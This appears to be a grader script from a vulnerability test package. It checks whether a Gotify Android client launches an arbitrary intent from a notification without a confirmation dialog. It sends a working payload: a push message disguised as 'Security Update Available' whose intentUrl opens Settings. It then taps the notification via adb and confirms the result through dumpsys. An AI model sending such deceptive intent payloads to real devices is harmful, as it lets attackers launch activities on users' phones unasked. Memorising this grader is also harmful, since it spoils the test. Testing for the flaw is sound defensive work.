#!/usr/bin/env python3
"""
Gotify Intent URL Confirmation Bypass — Verification Helper

Checks whether the vulnerability allows arbitrary intents to be launched
when a notification is clicked, bypassing the confirmation dialog.

Two checks are performed:

1. SETTINGS LAUNCH CHECK — Sends a push message with an intentUrl targeting
   the Android Settings app, then opens the notification shade and taps the
   notification. On the VULNERABLE build, clicking the notification launches
   Settings directly (Intent.parseUri bypasses the confirmation dialog).
   On the CLEAN build, clicking opens MessagesActivity (safe). Verification
   uses `adb shell dumpsys activity activities` to check the resumed
   activity. This is unfakeable — dumpsys queries the OS activity manager
   directly, not app-writable logs.

2. MESSAGE CHECK — Queries the Gotify server for messages containing the
   exploit's intentUrl marker. This confirms the malicious push message
   was actually sent.

Both must be true: the exploit message was sent AND Settings was launched.

Exit codes:
    0 — NOT VULNERABLE: Settings was not launched
    1 — VULNERABLE: Settings app was launched via the intent
"""
import json
import os
import subprocess
import sys
import time

import requests

# ---------------------------------------------------------------------------
# Configuration
# ---------------------------------------------------------------------------
GOTIFY_SERVER = "http://127.0.0.1:8080"
GOTIFY_USER = None  # Set from metadata.json
GOTIFY_PASS = None  # Set from metadata.json
PACKAGE = "com.github.gotify"

# The intent URL that targets Android Settings via Intent.parseUri().
SETTINGS_INTENT_URL = "intent:#Intent;component=com.android.settings/.Settings;end"

# Marker to find the exploit message on the server
EXPLOIT_CALLBACK_MARKER = "com.android.settings"

# What we look for in dumpsys activity output
SETTINGS_MARKER = "com.android.settings"


# ---------------------------------------------------------------------------
# ADB helpers
# ---------------------------------------------------------------------------
def _adb(*args, timeout=15):
    """Run an adb command and return the CompletedProcess."""
    return subprocess.run(
        ["adb", *args],
        capture_output=True,
        text=True,
        timeout=timeout,
    )


def _get_resumed_activity():
    """Query dumpsys for the currently resumed activity.

    Checks for multiple possible field names across Android versions:
    - "ResumedActivity" (common on newer Android versions)
    - "topResumedActivity" (also seen on newer versions)
    - "mResumedActivity" (older Android versions)

    Returns the matching line content, or None if not found.
    """
    result = _adb("shell", "dumpsys", "activity", "activities")
    for line in result.stdout.split("\n"):
        stripped = line.strip()
        if stripped.startswith("ResumedActivity:") or stripped.startswith(
            "topResumedActivity="
        ):
            return stripped
        if "mResumedActivity" in stripped:
            return stripped
    return None


def _get_screen_size():
    """Get the emulator screen dimensions via adb shell wm size."""
    result = _adb("shell", "wm", "size")
    # Output format: "Physical size: 1080x1920"
    for line in result.stdout.strip().split("\n"):
        if "size:" in line.lower():
            parts = line.split(":")[-1].strip()
            w, h = parts.split("x")
            return int(w), int(h)
    return 1080, 1920  # Fallback default


# ---------------------------------------------------------------------------
# Check 1: Send message, click notification, check resumed activity
# ---------------------------------------------------------------------------
def _get_or_create_app_token():
    """Return an application token we can use to push messages."""
    resp = requests.get(
        f"{GOTIFY_SERVER}/application",
        auth=(GOTIFY_USER, GOTIFY_PASS),
        timeout=10,
    )
    if resp.ok:
        apps = resp.json()
        if apps:
            return apps[0]["token"]

    resp = requests.post(
        f"{GOTIFY_SERVER}/application",
        auth=(GOTIFY_USER, GOTIFY_PASS),
        json={
            "name": "VerifyApp",
            "description": "Temporary app for verification",
        },
        timeout=10,
    )
    resp.raise_for_status()
    return resp.json()["token"]


def _send_settings_intent_message(app_token):
    """Push a message whose intentUrl targets the Settings app."""
    payload = {
        "title": "Security Update Available",
        "message": "Tap to install the latest patch.",
        "priority": 5,
        "extras": {
            "android::action": {
                "onReceive": {
                    "intentUrl": SETTINGS_INTENT_URL,
                }
            }
        },
    }
    resp = requests.post(
        f"{GOTIFY_SERVER}/message",
        headers={"X-Gotify-Key": app_token},
        json=payload,
        timeout=10,
    )
    resp.raise_for_status()
    return resp.json()


def _clear_notifications():
    """Clear all notifications via adb."""
    _adb("shell", "service", "call", "notification", "1")
    time.sleep(0.5)


def _tap_notification():
    """Open the notification shade and tap the first notification.

    Uses adb shell commands (cmd statusbar + input tap) instead of
    uiautomator to avoid text-matching issues on API 35 emulators.

    Returns True if the tap was performed (doesn't guarantee a hit).
    """
    w, h = _get_screen_size()
    print(f"[check_url] Screen size: {w}x{h}")

    # Open the notification shade
    _adb("shell", "cmd", "statusbar", "expand-notifications")
    time.sleep(2)

    # Tap at multiple Y positions to increase chance of hitting a notification.
    # Notifications typically start around 25-35% from the top of the screen.
    tap_x = w // 2
    tap_positions = [
        int(h * 0.30),
        int(h * 0.25),
        int(h * 0.35),
        int(h * 0.40),
    ]

    for i, tap_y in enumerate(tap_positions):
        print(f"[check_url] Tapping notification at ({tap_x}, {tap_y})...")
        _adb("shell", "input", "tap", str(tap_x), str(tap_y))
        time.sleep(2)

        # Check if we landed on Settings
        resumed = _get_resumed_activity()
        if resumed and SETTINGS_MARKER in resumed:
            print(f"[check_url] Settings launched after tap {i + 1}!")
            return True

        # Check if we navigated away from the notification shade
        # (i.e., we clicked something that opened an activity)
        if resumed and PACKAGE in resumed:
            print(
                f"[check_url] Gotify activity opened after tap {i + 1}: " f"{resumed}"
            )
            # On clean build, clicking notification opens MessagesActivity
            return False

    return False


def trigger_and_check_settings_launch():
    """Send a message, click its notification, and check if Settings opened.

    Steps:
    1. Clear existing notifications to avoid stale ones
    2. Send a push message with intentUrl targeting Settings
    3. Wait for the app to process the message and show a notification
    4. Press HOME to dismiss any foreground dialogs
    5. Open notification shade and tap the notification
    6. Check dumpsys for the resumed activity

    On the VULNERABLE build, the notification's content intent directly
    launches Settings (Intent.parseUri bypasses the confirmation dialog).
    On the CLEAN build, clicking opens MessagesActivity.

    Returns True if Settings is the currently resumed activity.
    """
    print("[check_url] --- Settings Launch Check ---")

    try:
        token = _get_or_create_app_token()
        print(f"[check_url] Obtained app token: {token[:8]}...")

        # Clear old notifications so we only have our fresh one
        print("[check_url] Clearing existing notifications...")
        _clear_notifications()
        time.sleep(1)

        print("[check_url] Sending push message with Settings intentUrl...")
        msg = _send_settings_intent_message(token)
        print(f"[check_url] Message sent (id={msg.get('id')})")

        print("[check_url] Waiting 5 seconds for notification to appear...")
        time.sleep(5)

    except requests.exceptions.ConnectionError as e:
        print(
            f"[check_url] ERROR: Cannot connect to Gotify server: {e}",
            file=sys.stderr,
        )
        return False
    except Exception as e:
        print(f"[check_url] ERROR sending message: {e}", file=sys.stderr)
        return False

    # Press HOME to dismiss any foreground dialogs (e.g. IntentUrlDialogActivity)
    print("[check_url] Pressing HOME to dismiss any foreground dialogs...")
    _adb("shell", "input", "keyevent", "KEYCODE_HOME")
    time.sleep(1)

    # Tap the notification and check the result
    settings_opened = _tap_notification()

    if settings_opened:
        print("[check_url] Settings app was launched via notification click")
        return True

    # Final check — maybe Settings was already launched before our taps
    resumed = _get_resumed_activity()
    if resumed:
        print(f"[check_url] Final resumed activity: {resumed}")
        if SETTINGS_MARKER in resumed:
            print("[check_url] Settings app is the resumed activity")
            return True

    print("[check_url] Settings app is NOT the resumed activity")
    return False


# ---------------------------------------------------------------------------
# Check 2: Did the exploit send the malicious message?
# ---------------------------------------------------------------------------
def detect_exploit_message():
    """Check if the Gotify server has a message with the exploit's intentUrl.

    Queries the Gotify REST API for messages and looks for ones containing
    the exploit's callback URL marker.

    Returns True if an exploit message is found on the server.
    """
    print("[check_url] --- Message Check ---")

    try:
        resp = requests.get(
            f"{GOTIFY_SERVER}/message",
            auth=(GOTIFY_USER, GOTIFY_PASS),
            timeout=10,
        )
        if not resp.ok:
            print(
                f"[check_url] ERROR: Failed to query messages: {resp.status_code}",
                file=sys.stderr,
            )
            return False

        data = resp.json()
        messages = data.get("messages", [])
        print(f"[check_url] Found {len(messages)} message(s) on server")

        for msg in messages:
            extras = msg.get("extras", {})
            android_action = extras.get("android::action", {})
            on_receive = android_action.get("onReceive", {})
            intent_url = on_receive.get("intentUrl", "")

            if EXPLOIT_CALLBACK_MARKER in intent_url:
                print(
                    f"[check_url] Found exploit message "
                    f"(id={msg.get('id')}): intentUrl={intent_url}"
                )
                return True

        print(
            f"[check_url] No messages with '{EXPLOIT_CALLBACK_MARKER}' "
            "in intentUrl found"
        )
        return False

    except requests.exceptions.ConnectionError as e:
        print(
            f"[check_url] ERROR: Cannot connect to Gotify server: {e}",
            file=sys.stderr,
        )
        return False


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------
def main():
    global GOTIFY_USER, GOTIFY_PASS

    script_dir = os.path.dirname(os.path.abspath(__file__))
    metadata_path = os.path.join(script_dir, "../../../metadata.json")

    try:
        with open(metadata_path, "r") as f:
            metadata = json.load(f)
        GOTIFY_USER = metadata["username"]
        GOTIFY_PASS = metadata["password"]
    except (FileNotFoundError, KeyError) as e:
        print(
            f"[check_url] Error reading metadata.json: {e}",
            file=sys.stderr,
        )
        sys.exit(1)

    # Check 1: Does clicking the notification launch Settings?
    settings_launched = trigger_and_check_settings_launch()

    # Check 2: Did the exploit send the malicious message?
    exploit_message_found = detect_exploit_message()

    # Report results
    print("[check_url] --- Results ---")
    print(f"[check_url] Settings app launched:         {settings_launched}")
    print(f"[check_url] Exploit message on server:     {exploit_message_found}")

    if settings_launched and exploit_message_found:
        print(
            "[check_url] VULNERABLE: exploit message was sent AND Settings "
            "app was launched via notification click (no confirmation dialog)"
        )
        sys.exit(1)
    elif exploit_message_found and not settings_launched:
        print(
            "[check_url] NOT VULNERABLE: exploit message exists but Settings "
            "did not launch (confirmation dialog blocked it)"
        )
        sys.exit(0)
    elif settings_launched and not exploit_message_found:
        print(
            "[check_url] NOT VULNERABLE: Settings launched but no exploit "
            "message found (possible manual launch)"
        )
        sys.exit(0)
    else:
        print(
            "[check_url] NOT VULNERABLE: no exploit message and no "
            "Settings launch detected"
        )
        sys.exit(0)


if __name__ == "__main__":
    main()
